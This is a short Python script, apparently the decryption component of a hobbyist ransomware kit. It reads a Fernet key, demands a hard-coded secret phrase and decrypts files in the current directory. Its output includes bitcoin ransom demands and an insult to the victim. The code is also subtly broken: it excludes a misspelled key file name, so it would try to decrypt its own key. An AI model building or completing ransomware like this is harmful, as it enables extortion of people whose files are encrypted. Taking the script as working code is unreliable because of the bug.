#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
# let's find the files

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "theykey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats, you're files are decrypted, enjoy your porn")
else:
	print("Sorry. Wrong secret phrase. Send me more bitcoin.")

print("All of your files have been encrypted, pay the ransome or you will loose them for eva.")
